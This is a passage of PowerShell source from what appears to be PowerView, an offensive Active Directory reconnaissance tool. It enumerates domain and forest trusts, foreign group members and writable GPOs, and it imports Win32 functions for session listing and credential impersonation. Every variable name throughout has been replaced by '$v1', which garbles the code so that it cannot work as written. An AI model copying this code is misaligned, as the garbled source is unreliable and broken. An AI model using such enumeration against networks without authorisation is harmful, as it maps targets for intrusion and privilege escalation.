            Write-Verbose "[Find-DomainLocalGroupMember] Using threading with threads: $v1"


            $v1 = @{
                'GroupName' = $v1
                'Method' = $v1
                'TokenHandle' = $v1
            }


            New-ThreadedFunction -ComputerName $v1 -ScriptBlock $v1 -ScriptParameters $v1 -Threads $v1
        }
    }

    END {
        if ($v1) {
            Invoke-RevertToSelf -TokenHandle $v1
        }
    }
}








function Get-DomainTrust {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DomainTrust.NET')]
    [OutputType('PowerView.DomainTrust.LDAP')]
    [OutputType('PowerView.DomainTrust.API')]
    [CmdletBinding(DefaultParameterSetName = 'LDAP')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $v1, ValueFromPipelineByPropertyName = $v1)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $v1,

        [Parameter(ParameterSetName = 'API')]
        [Switch]
        $v1,

        [Parameter(ParameterSetName = 'NET')]
        [Switch]
        $v1,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $v1,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $v1,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $v1,

        [Parameter(ParameterSetName = 'LDAP')]
        [Parameter(ParameterSetName = 'API')]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $v1,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $v1 = 'Subtree',

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        $v1 = 200,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        $v1,

        [Parameter(ParameterSetName = 'LDAP')]
        [Switch]
        $v1,

        [Alias('ReturnOne')]
        [Switch]
        $v1,

        [Parameter(ParameterSetName = 'LDAP')]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $v1 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $v1 = @{
            [uint32]'0x00000001' = 'NON_TRANSITIVE'
            [uint32]'0x00000002' = 'UPLEVEL_ONLY'
            [uint32]'0x00000004' = 'FILTER_SIDS'
            [uint32]'0x00000008' = 'FOREST_TRANSITIVE'
            [uint32]'0x00000010' = 'CROSS_ORGANIZATION'
            [uint32]'0x00000020' = 'WITHIN_FOREST'
            [uint32]'0x00000040' = 'TREAT_AS_EXTERNAL'
            [uint32]'0x00000080' = 'TRUST_USES_RC4_ENCRYPTION'
            [uint32]'0x00000100' = 'TRUST_USES_AES_KEYS'
            [uint32]'0x00000200' = 'CROSS_ORGANIZATION_NO_TGT_DELEGATION'
            [uint32]'0x00000400' = 'PIM_TRUST'
        }

        $v1 = @{}
        if ($v1['Domain']) { $v1['Domain'] = $v1 }
        if ($v1['LDAPFilter']) { $v1['LDAPFilter'] = $v1 }
        if ($v1['Properties']) { $v1['Properties'] = $v1 }
        if ($v1['SearchBase']) { $v1['SearchBase'] = $v1 }
        if ($v1['Server']) { $v1['Server'] = $v1 }
        if ($v1['SearchScope']) { $v1['SearchScope'] = $v1 }
        if ($v1['ResultPageSize']) { $v1['ResultPageSize'] = $v1 }
        if ($v1['ServerTimeLimit']) { $v1['ServerTimeLimit'] = $v1 }
        if ($v1['Tombstone']) { $v1['Tombstone'] = $v1 }
        if ($v1['Credential']) { $v1['Credential'] = $v1 }
    }

    PROCESS {
        if ($v1.ParameterSetName -ne 'API') {
            $v1 = @{}
            if ($v1 -and $v1.Trim() -ne '') {
                $v1 = $v1
            }
            else {
                if ($v1['Credential']) {
                    $v1 = (Get-Domain -Credential $v1).Name
                }
                else {
                    $v1 = (Get-Domain).Name
                }
            }
        }
        elseif ($v1.ParameterSetName -ne 'NET') {
            if ($v1 -and $v1.Trim() -ne '') {
                $v1 = $v1
            }
            else {
                $v1 = $v1:USERDNSDOMAIN
            }
        }

        if ($v1.ParameterSetName -eq 'LDAP') {

            $v1 = Get-DomainSearcher @LdapSearcherArguments
            $v1 = Get-DomainSID @NetSearcherArguments

            if ($v1) {

                $v1.Filter = '(objectClass=trustedDomain)'

                if ($v1['FindOne']) { $v1 = $v1.FindOne() }
                else { $v1 = $v1.FindAll() }
                $v1 | Where-Object {$v1} | ForEach-Object {
                    $v1 = $v1.Properties
                    $v1 = New-Object PSObject

                    $v1 = @()
                    $v1 += $v1.Keys | Where-Object { $v1.trustattributes[0] -band $v1 } | ForEach-Object { $v1[$v1] }

                    $v1 = Switch ($v1.trustdirection) {
                        0 { 'Disabled' }
                        1 { 'Inbound' }
                        2 { 'Outbound' }
                        3 { 'Bidirectional' }
                    }

                    $v1 = Switch ($v1.trusttype) {
                        1 { 'WINDOWS_NON_ACTIVE_DIRECTORY' }
                        2 { 'WINDOWS_ACTIVE_DIRECTORY' }
                        3 { 'MIT' }
                    }

                    $v1 = $v1.distinguishedname[0]
                    $v1 = $v1.IndexOf('DC=')
                    if ($v1) {
                        $v1 = $($v1.SubString($v1)) -replace 'DC=','' -replace ',','.'
                    }
                    else {
                        $v1 = ""
                    }

                    $v1 = $v1.IndexOf(',CN=System')
                    if ($v1) {
                        $v1 = $v1.SubString(3, $v1-3)
                    }
                    else {
                        $v1 = ""
                    }

                    $v1 = New-Object Guid @(,$v1.objectguid[0])
                    $v1 = (New-Object System.Security.Principal.SecurityIdentifier($v1.securityidentifier[0],0)).Value

                    $v1 | Add-Member Noteproperty 'SourceName' $v1
                    $v1 | Add-Member Noteproperty 'TargetName' $v1.name[0]

                    $v1 | Add-Member Noteproperty 'TrustType' $v1
                    $v1 | Add-Member Noteproperty 'TrustAttributes' $($v1 -join ',')
                    $v1 | Add-Member Noteproperty 'TrustDirection' "$v1"
                    $v1 | Add-Member Noteproperty 'WhenCreated' $v1.whencreated[0]
                    $v1 | Add-Member Noteproperty 'WhenChanged' $v1.whenchanged[0]
                    $v1.PSObject.TypeNames.Insert(0, 'PowerView.DomainTrust.LDAP')
                    $v1
                }
                if ($v1) {
                    try { $v1.dispose() }
                    catch {
                        Write-Verbose "[Get-DomainTrust] Error disposing of the Results object: $v1"
                    }
                }
                $v1.dispose()
            }
        }
        elseif ($v1.ParameterSetName -eq 'API') {

            if ($v1['Server']) {
                $v1 = $v1
            }
            elseif ($v1 -and $v1.Trim() -ne '') {
                $v1 = $v1
            }
            else {

                $v1 = $v1
            }


            $v1 = [IntPtr]::Zero


            $v1 = 63
            $v1 = 0


            $v1 = $v1::DsEnumerateDomainTrusts($v1, $v1, [ref]$v1, [ref]$v1)


            $v1 = $v1.ToInt64()


            if (($v1 -eq 0) -and ($v1 -gt 0)) {


                $v1 = $v1::GetSize()


                for ($v1 = 0; ($v1 -lt $v1); $v1++) {

                    $v1 = New-Object System.Intptr -ArgumentList $v1
                    $v1 = $v1 -as $v1

                    $v1 = $v1.ToInt64()
                    $v1 += $v1

                    $v1 = ''
                    $v1 = $v1::ConvertSidToStringSid($v1.DomainSid, [ref]$v1);$v1 = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                    if ($v1 -eq 0) {
                        Write-Verbose "[Get-DomainTrust] Error: $(([ComponentModel.Win32Exception] $v1).Message)"
                    }
                    else {
                        $v1 = New-Object PSObject
                        $v1 | Add-Member Noteproperty 'SourceName' $v1
                        $v1 | Add-Member Noteproperty 'TargetName' $v1.DnsDomainName
                        $v1 | Add-Member Noteproperty 'TargetNetbiosName' $v1.NetbiosDomainName
                        $v1 | Add-Member Noteproperty 'Flags' $v1.Flags
                        $v1 | Add-Member Noteproperty 'ParentIndex' $v1.ParentIndex
                        $v1 | Add-Member Noteproperty 'TrustType' $v1.TrustType
                        $v1 | Add-Member Noteproperty 'TrustAttributes' $v1.TrustAttributes
                        $v1 | Add-Member Noteproperty 'TargetSid' $v1
                        $v1 | Add-Member Noteproperty 'TargetGuid' $v1.DomainGuid
                        $v1.PSObject.TypeNames.Insert(0, 'PowerView.DomainTrust.API')
                        $v1
                    }
                }

                $v1 = $v1::NetApiBufferFree($v1)
            }
            else {
                Write-Verbose "[Get-DomainTrust] Error: $(([ComponentModel.Win32Exception] $v1).Message)"
            }
        }
        else {

            $v1 = Get-Domain @NetSearcherArguments
            if ($v1) {
                $v1.GetAllTrustRelationships() | ForEach-Object {
                    $v1.PSObject.TypeNames.Insert(0, 'PowerView.DomainTrust.NET')
                    $v1
                }
            }
        }
    }
}


function Get-ForestTrust {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ForestTrust.NET')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $v1, ValueFromPipelineByPropertyName = $v1)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $v1,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $v1 = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        $v1 = @{}
        if ($v1['Forest']) { $v1['Forest'] = $v1 }
        if ($v1['Credential']) { $v1['Credential'] = $v1 }

        $v1 = Get-Forest @NetForestArguments

        if ($v1) {
            $v1.GetAllTrustRelationships() | ForEach-Object {
                $v1.PSObject.TypeNames.Insert(0, 'PowerView.ForestTrust.NET')
                $v1
            }
        }
    }
}


function Get-DomainForeignUser {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ForeignUser')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $v1, ValueFromPipelineByPropertyName = $v1)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $v1,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $v1 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $v1 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $v1,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $v1,

        [Switch]
        $v1,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $v1 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $v1 = @{}
        $v1['LDAPFilter'] = '(memberof=*)'
        if ($v1['Domain']) { $v1['Domain'] = $v1 }
        if ($v1['Properties']) { $v1['Properties'] = $v1 }
        if ($v1['SearchBase']) { $v1['SearchBase'] = $v1 }
        if ($v1['Server']) { $v1['Server'] = $v1 }
        if ($v1['SearchScope']) { $v1['SearchScope'] = $v1 }
        if ($v1['ResultPageSize']) { $v1['ResultPageSize'] = $v1 }
        if ($v1['ServerTimeLimit']) { $v1['ServerTimeLimit'] = $v1 }
        if ($v1['SecurityMasks']) { $v1['SecurityMasks'] = $v1 }
        if ($v1['Tombstone']) { $v1['Tombstone'] = $v1 }
        if ($v1['Credential']) { $v1['Credential'] = $v1 }
        if ($v1['Raw']) { $v1['Raw'] = $v1 }
    }

    PROCESS {
        Get-DomainUser @SearcherArguments  | ForEach-Object {
            ForEach ($v1 in $v1.memberof) {
                $v1 = $v1.IndexOf('DC=')
                if ($v1) {

                    $v1 = $($v1.SubString($v1)) -replace 'DC=','' -replace ',','.'
                    $v1 = $v1.distinguishedname
                    $v1 = $v1.IndexOf('DC=')
                    $v1 = $($v1.distinguishedname.SubString($v1)) -replace 'DC=','' -replace ',','.'

                    if ($v1 -ne $v1) {

                        $v1 = $v1.Split(',')[0].split('=')[1]
                        $v1 = New-Object PSObject
                        $v1 | Add-Member Noteproperty 'UserDomain' $v1
                        $v1 | Add-Member Noteproperty 'UserName' $v1.samaccountname
                        $v1 | Add-Member Noteproperty 'UserDistinguishedName' $v1.distinguishedname
                        $v1 | Add-Member Noteproperty 'GroupDomain' $v1
                        $v1 | Add-Member Noteproperty 'GroupName' $v1
                        $v1 | Add-Member Noteproperty 'GroupDistinguishedName' $v1
                        $v1.PSObject.TypeNames.Insert(0, 'PowerView.ForeignUser')
                        $v1
                    }
                }
            }
        }
    }
}


function Get-DomainForeignGroupMember {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ForeignGroupMember')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $v1, ValueFromPipelineByPropertyName = $v1)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $v1,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $v1 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $v1 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $v1,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $v1,

        [Switch]
        $v1,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $v1 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $v1 = @{}
        $v1['LDAPFilter'] = '(member=*)'
        if ($v1['Domain']) { $v1['Domain'] = $v1 }
        if ($v1['Properties']) { $v1['Properties'] = $v1 }
        if ($v1['SearchBase']) { $v1['SearchBase'] = $v1 }
        if ($v1['Server']) { $v1['Server'] = $v1 }
        if ($v1['SearchScope']) { $v1['SearchScope'] = $v1 }
        if ($v1['ResultPageSize']) { $v1['ResultPageSize'] = $v1 }
        if ($v1['ServerTimeLimit']) { $v1['ServerTimeLimit'] = $v1 }
        if ($v1['SecurityMasks']) { $v1['SecurityMasks'] = $v1 }
        if ($v1['Tombstone']) { $v1['Tombstone'] = $v1 }
        if ($v1['Credential']) { $v1['Credential'] = $v1 }
        if ($v1['Raw']) { $v1['Raw'] = $v1 }
    }

    PROCESS {

        $v1 = @('Users', 'Domain Users', 'Guests')

        Get-DomainGroup @SearcherArguments | Where-Object { $v1 -notcontains $v1.samaccountname } | ForEach-Object {
            $v1 = $v1.samAccountName
            $v1 = $v1.distinguishedname
            $v1 = $v1.SubString($v1.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'

            $v1.member | ForEach-Object {


                $v1 = $v1.SubString($v1.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                if (($v1 -match 'CN=S-1-5-21.*-.*') -or ($v1 -ne $v1)) {
                    $v1 = $v1
                    $v1 = $v1.Split(',')[0].split('=')[1]

                    $v1 = New-Object PSObject
                    $v1 | Add-Member Noteproperty 'GroupDomain' $v1
                    $v1 | Add-Member Noteproperty 'GroupName' $v1
                    $v1 | Add-Member Noteproperty 'GroupDistinguishedName' $v1
                    $v1 | Add-Member Noteproperty 'MemberDomain' $v1
                    $v1 | Add-Member Noteproperty 'MemberName' $v1
                    $v1 | Add-Member Noteproperty 'MemberDistinguishedName' $v1
                    $v1.PSObject.TypeNames.Insert(0, 'PowerView.ForeignGroupMember')
                    $v1
                }
            }
        }
    }
}


function Get-DomainTrustMapping {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DomainTrust.NET')]
    [OutputType('PowerView.DomainTrust.LDAP')]
    [OutputType('PowerView.DomainTrust.API')]
    [CmdletBinding(DefaultParameterSetName = 'LDAP')]
    Param(
        [Parameter(ParameterSetName = 'API')]
        [Switch]
        $v1,

        [Parameter(ParameterSetName = 'NET')]
        [Switch]
        $v1,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $v1,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $v1,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $v1,

        [Parameter(ParameterSetName = 'LDAP')]
        [Parameter(ParameterSetName = 'API')]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $v1,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $v1 = 'Subtree',

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        $v1 = 200,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        $v1,

        [Parameter(ParameterSetName = 'LDAP')]
        [Switch]
        $v1,

        [Parameter(ParameterSetName = 'LDAP')]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $v1 = [Management.Automation.PSCredential]::Empty
    )


    $v1 = @{}


    $v1 = New-Object System.Collections.Stack

    $v1 = @{}
    if ($v1['API']) { $v1['API'] = $v1 }
    if ($v1['NET']) { $v1['NET'] = $v1 }
    if ($v1['LDAPFilter']) { $v1['LDAPFilter'] = $v1 }
    if ($v1['Properties']) { $v1['Properties'] = $v1 }
    if ($v1['SearchBase']) { $v1['SearchBase'] = $v1 }
    if ($v1['Server']) { $v1['Server'] = $v1 }
    if ($v1['SearchScope']) { $v1['SearchScope'] = $v1 }
    if ($v1['ResultPageSize']) { $v1['ResultPageSize'] = $v1 }
    if ($v1['ServerTimeLimit']) { $v1['ServerTimeLimit'] = $v1 }
    if ($v1['Tombstone']) { $v1['Tombstone'] = $v1 }
    if ($v1['Credential']) { $v1['Credential'] = $v1 }


    if ($v1['Credential']) {
        $v1 = (Get-Domain -Credential $v1).Name
    }
    else {
        $v1 = (Get-Domain).Name
    }
    $v1.Push($v1)

    while($v1.Count -ne 0) {

        $v1 = $v1.Pop()


        if ($v1 -and ($v1.Trim() -ne '') -and (-not $v1.ContainsKey($v1))) {

            Write-Verbose "[Get-DomainTrustMapping] Enumerating trusts for domain: '$v1'"


            $v1 = $v1.Add($v1, '')

            try {

                $v1['Domain'] = $v1
                $v1 = Get-DomainTrust @DomainTrustArguments

                if ($v1 -isnot [System.Array]) {
                    $v1 = @($v1)
                }


                if ($v1.ParameterSetName -eq 'NET') {
                    $v1 = @{}
                    if ($v1['Forest']) { $v1['Forest'] = $v1 }
                    if ($v1['Credential']) { $v1['Credential'] = $v1 }
                    $v1 += Get-ForestTrust @ForestTrustArguments
                }

                if ($v1) {
                    if ($v1 -isnot [System.Array]) {
                        $v1 = @($v1)
                    }


                    ForEach ($v1 in $v1) {
                        if ($v1.SourceName -and $v1.TargetName) {

                            $v1 = $v1.Push($v1.TargetName)
                            $v1
                        }
                    }
                }
            }
            catch {
                Write-Verbose "[Get-DomainTrustMapping] Error: $v1"
            }
        }
    }
}


function Get-GPODelegation {

    [CmdletBinding()]
    Param (
        [String]
        $v1 = '*',

        [ValidateRange(1,10000)]
        [Int]
        $v1 = 200
    )

    $v1 = @('SYSTEM','Domain Admins','Enterprise Admins')

    $v1 = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
    $v1 = @($v1.Domains)
    $v1 = $v1 | foreach { $v1.GetDirectoryEntry() }
    foreach ($v1 in $v1) {
        $v1 = "(&(objectCategory=groupPolicyContainer)(displayname=$v1))"
        $v1 = New-Object System.DirectoryServices.DirectorySearcher
        $v1.SearchRoot = $v1
        $v1.Filter = $v1
        $v1.PageSize = $v1
        $v1.SearchScope = "Subtree"
        $v1 = $v1.FindAll()
        foreach ($v1 in $v1){
            $v1 = ([ADSI]$v1.path).ObjectSecurity.Access | ? {$v1.ActiveDirectoryRights -match "Write" -and $v1.AccessControlType -eq "Allow" -and  $v1 -notcontains $v1.IdentityReference.toString().split("\")[1] -and $v1.IdentityReference -ne "CREATOR OWNER"}
        if ($v1 -ne $v1){
            $v1 = New-Object psobject
            $v1 | Add-Member Noteproperty 'ADSPath' $v1.Properties.adspath
            $v1 | Add-Member Noteproperty 'GPODisplayName' $v1.Properties.displayname
            $v1 | Add-Member Noteproperty 'IdentityReference' $v1.IdentityReference
            $v1 | Add-Member Noteproperty 'ActiveDirectoryRights' $v1.ActiveDirectoryRights
            $v1
        }
        }
    }
}











$v1 = New-InMemoryModule -ModuleName Win32




$v1 = psenum $v1 PowerView.SamAccountTypeEnum UInt32 @{
    DOMAIN_OBJECT                   =   '0x00000000'
    GROUP_OBJECT                    =   '0x10000000'
    NON_SECURITY_GROUP_OBJECT       =   '0x10000001'
    ALIAS_OBJECT                    =   '0x20000000'
    NON_SECURITY_ALIAS_OBJECT       =   '0x20000001'
    USER_OBJECT                     =   '0x30000000'
    MACHINE_ACCOUNT                 =   '0x30000001'
    TRUST_ACCOUNT                   =   '0x30000002'
    APP_BASIC_GROUP                 =   '0x40000000'
    APP_QUERY_GROUP                 =   '0x40000001'
    ACCOUNT_TYPE_MAX                =   '0x7fffffff'
}


$v1 = psenum $v1 PowerView.GroupTypeEnum UInt32 @{
    CREATED_BY_SYSTEM               =   '0x00000001'
    GLOBAL_SCOPE                    =   '0x00000002'
    DOMAIN_LOCAL_SCOPE              =   '0x00000004'
    UNIVERSAL_SCOPE                 =   '0x00000008'
    APP_BASIC                       =   '0x00000010'
    APP_QUERY                       =   '0x00000020'
    SECURITY                        =   '0x80000000'
} -Bitfield


$v1 = psenum $v1 PowerView.UACEnum UInt32 @{
    SCRIPT                          =   1
    ACCOUNTDISABLE                  =   2
    HOMEDIR_REQUIRED                =   8
    LOCKOUT                         =   16
    PASSWD_NOTREQD                  =   32
    PASSWD_CANT_CHANGE              =   64
    ENCRYPTED_TEXT_PWD_ALLOWED      =   128
    TEMP_DUPLICATE_ACCOUNT          =   256
    NORMAL_ACCOUNT                  =   512
    INTERDOMAIN_TRUST_ACCOUNT       =   2048
    WORKSTATION_TRUST_ACCOUNT       =   4096
    SERVER_TRUST_ACCOUNT            =   8192
    DONT_EXPIRE_PASSWORD            =   65536
    MNS_LOGON_ACCOUNT               =   131072
    SMARTCARD_REQUIRED              =   262144
    TRUSTED_FOR_DELEGATION          =   524288
    NOT_DELEGATED                   =   1048576
    USE_DES_KEY_ONLY                =   2097152
    DONT_REQ_PREAUTH                =   4194304
    PASSWORD_EXPIRED                =   8388608
    TRUSTED_TO_AUTH_FOR_DELEGATION  =   16777216
    PARTIAL_SECRETS_ACCOUNT         =   67108864
} -Bitfield


$v1 = psenum $v1 WTS_CONNECTSTATE_CLASS UInt16 @{
    Active       =    0
    Connected    =    1
    ConnectQuery =    2
    Shadow       =    3
    Disconnected =    4
    Idle         =    5
    Listen       =    6
    Reset        =    7
    Down         =    8
    Init         =    9
}


$v1 = struct $v1 PowerView.RDPSessionInfo @{
    ExecEnvId = field 0 UInt32
    State = field 1 $v1
    SessionId = field 2 UInt32
    pSessionName = field 3 String -MarshalAs @('LPWStr')
    pHostName = field 4 String -MarshalAs @('LPWStr')
    pUserName = field 5 String -MarshalAs @('LPWStr')
    pDomainName = field 6 String -MarshalAs @('LPWStr')
    pFarmName = field 7 String -MarshalAs @('LPWStr')
}


$v1 = struct $v1 WTS_CLIENT_ADDRESS @{
    AddressFamily = field 0 UInt32
    Address = field 1 Byte[] -MarshalAs @('ByValArray', 20)
}


$v1 = struct $v1 PowerView.ShareInfo @{
    Name = field 0 String -MarshalAs @('LPWStr')
    Type = field 1 UInt32
    Remark = field 2 String -MarshalAs @('LPWStr')
}


$v1 = struct $v1 PowerView.LoggedOnUserInfo @{
    UserName = field 0 String -MarshalAs @('LPWStr')
    LogonDomain = field 1 String -MarshalAs @('LPWStr')
    AuthDomains = field 2 String -MarshalAs @('LPWStr')
    LogonServer = field 3 String -MarshalAs @('LPWStr')
}


$v1 = struct $v1 PowerView.SessionInfo @{
    CName = field 0 String -MarshalAs @('LPWStr')
    UserName = field 1 String -MarshalAs @('LPWStr')
    Time = field 2 UInt32
    IdleTime = field 3 UInt32
}


$v1 = psenum $v1 SID_NAME_USE UInt16 @{
    SidTypeUser             = 1
    SidTypeGroup            = 2
    SidTypeDomain           = 3
    SidTypeAlias            = 4
    SidTypeWellKnownGroup   = 5
    SidTypeDeletedAccount   = 6
    SidTypeInvalid          = 7
    SidTypeUnknown          = 8
    SidTypeComputer         = 9
}


$v1 = struct $v1 LOCALGROUP_INFO_1 @{
    lgrpi1_name = field 0 String -MarshalAs @('LPWStr')
    lgrpi1_comment = field 1 String -MarshalAs @('LPWStr')
}


$v1 = struct $v1 LOCALGROUP_MEMBERS_INFO_2 @{
    lgrmi2_sid = field 0 IntPtr
    lgrmi2_sidusage = field 1 $v1
    lgrmi2_domainandname = field 2 String -MarshalAs @('LPWStr')
}


$v1 = psenum $v1 DsDomain.Flags UInt32 @{
    IN_FOREST       = 1
    DIRECT_OUTBOUND = 2
    TREE_ROOT       = 4
    PRIMARY         = 8
    NATIVE_MODE     = 16
    DIRECT_INBOUND  = 32
} -Bitfield
$v1 = psenum $v1 DsDomain.TrustType UInt32 @{
    DOWNLEVEL   = 1
    UPLEVEL     = 2
    MIT         = 3
    DCE         = 4
}
$v1 = psenum $v1 DsDomain.TrustAttributes UInt32 @{
    NON_TRANSITIVE      = 1
    UPLEVEL_ONLY        = 2
    FILTER_SIDS         = 4
    FOREST_TRANSITIVE   = 8
    CROSS_ORGANIZATION  = 16
    WITHIN_FOREST       = 32
    TREAT_AS_EXTERNAL   = 64
}


$v1 = struct $v1 DS_DOMAIN_TRUSTS @{
    NetbiosDomainName = field 0 String -MarshalAs @('LPWStr')
    DnsDomainName = field 1 String -MarshalAs @('LPWStr')
    Flags = field 2 $v1
    ParentIndex = field 3 UInt32
    TrustType = field 4 $v1
    TrustAttributes = field 5 $v1
    DomainSid = field 6 IntPtr
    DomainGuid = field 7 Guid
}


$v1 = struct $v1 NETRESOURCEW @{
    dwScope =         field 0 UInt32
    dwType =          field 1 UInt32
    dwDisplayType =   field 2 UInt32
    dwUsage =         field 3 UInt32
    lpLocalName =     field 4 String -MarshalAs @('LPWStr')
    lpRemoteName =    field 5 String -MarshalAs @('LPWStr')
    lpComment =       field 6 String -MarshalAs @('LPWStr')
    lpProvider =      field 7 String -MarshalAs @('LPWStr')
}


$v1 = @(
    (func netapi32 NetShareEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetWkstaUserEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetSessionEnum ([Int]) @([String], [String], [String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetLocalGroupEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetLocalGroupGetMembers ([Int]) @([String], [String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 DsGetSiteName ([Int]) @([String], [IntPtr].MakeByRefType())),
    (func netapi32 DsEnumerateDomainTrusts ([Int]) @([String], [UInt32], [IntPtr].MakeByRefType(), [IntPtr].MakeByRefType())),
    (func netapi32 NetApiBufferFree ([Int]) @([IntPtr])),
    (func advapi32 ConvertSidToStringSid ([Int]) @([IntPtr], [String].MakeByRefType()) -SetLastError),
    (func advapi32 OpenSCManagerW ([IntPtr]) @([String], [String], [Int]) -SetLastError),
    (func advapi32 CloseServiceHandle ([Int]) @([IntPtr])),
    (func advapi32 LogonUser ([Bool]) @([String], [String], [String], [UInt32], [UInt32], [IntPtr].MakeByRefType()) -SetLastError),
    (func advapi32 ImpersonateLoggedOnUser ([Bool]) @([IntPtr]) -SetLastError),
    (func advapi32 RevertToSelf ([Bool]) @() -SetLastError),
    (func wtsapi32 WTSOpenServerEx ([IntPtr]) @([String])),
    (func wtsapi32 WTSEnumerateSessionsEx ([Int]) @([IntPtr], [Int32].MakeByRefType(), [Int], [IntPtr].MakeByRefType(), [Int32].MakeByRefType()) -SetLastError),
    (func wtsapi32 WTSQuerySessionInformation ([Int]) @([IntPtr], [Int], [Int], [IntPtr].MakeByRefType(), [Int32].MakeByRefType()) -SetLastError),
    (func wtsapi32 WTSFreeMemoryEx ([Int]) @([Int32], [IntPtr], [Int32])),
    (func wtsapi32 WTSFreeMemory ([Int]) @([IntPtr])),
    (func wtsapi32 WTSCloseServer ([Int]) @([IntPtr])),
    (func Mpr WNetAddConnection2W ([Int]) @($v1, [String], [String], [UInt32])),
    (func Mpr WNetCancelConnection2 ([Int]) @([String], [Int], [Bool])),
    (func kernel32 CloseHandle ([Bool]) @([IntPtr]) -SetLastError)
)

$v1 = $v1 | Add-Win32Type -Module $v1 -Namespace 'Win32'
$v1 = $v1['netapi32']
$v1 = $v1['advapi32']
$v1 = $v1['wtsapi32']
$v1 = $v1['Mpr']
$v1 = $v1['kernel32']

Set-Alias Get-IPAddress Resolve-IPAddress
Set-Alias Convert-NameToSid ConvertTo-SID
Set-Alias Convert-SidToName ConvertFrom-SID
Set-Alias Request-SPNTicket Get-DomainSPNTicket
Set-Alias Get-DNSZone Get-DomainDNSZone
